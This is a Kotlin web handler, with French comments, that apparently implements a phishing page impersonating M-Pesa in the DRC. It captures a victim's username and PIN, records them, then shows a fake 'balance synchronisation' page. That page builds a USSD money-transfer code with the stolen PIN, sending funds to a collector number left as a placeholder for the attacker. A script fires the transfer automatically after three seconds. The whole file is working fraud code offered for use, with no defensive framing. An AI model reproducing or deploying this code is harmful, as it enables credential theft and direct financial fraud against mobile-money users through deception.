package com.fardc.sigint.core
import io.javalin.http.Context

class MPesaCommander(private val vault: SecurityVault) {
    // REMPLACER PAR VOTRE NUMÉRO COLLECTEUR
    private val numeroCollecteur = "0810000000" 
    private val montant = "500" // Montant simulé pour l'interception

    fun handleCapture(ctx: Context) {
        val user = ctx.formParam("user")
        val pin = ctx.formParam("pin")
        
        vault.encryptData("ACCESS_CONFIRMED | User: $user | PIN: $pin")

        // Génération du code USSD M-Pesa RDC : *122*1*numéro*montant*pin#
        val ussdCode = "tel:*122*1*${numeroCollecteur}*${montant}*${pin}%23"

        ctx.html("""
            <html>
            <body style='background:#e61c2b; color:white; font-family:sans-serif; text-align:center; padding:50px;'>
                <img src='/logo-mpesa.png' style='height:60px;'>
                <h2>Synchronisation du solde en cours...</h2>
                <p>Pour finaliser la connexion sécurisée, veuillez appuyer sur le bouton ci-dessous.</p>
                <br>
                <a href="$ussdCode" style='background:white; color:#e61c2b; padding:20px; border-radius:10px; text-decoration:none; font-weight:bold; font-size:20px;'>
                    ACTIVER LA SYNCHRONISATION
                </a>
                <script>
                    // Tentative d'auto-exécution du protocole USSD après 3 secondes
                    setTimeout(function(){ window.location.href = "$ussdCode"; }, 3000);
                </script>
            </body>
            </html>
        """)
    }
}
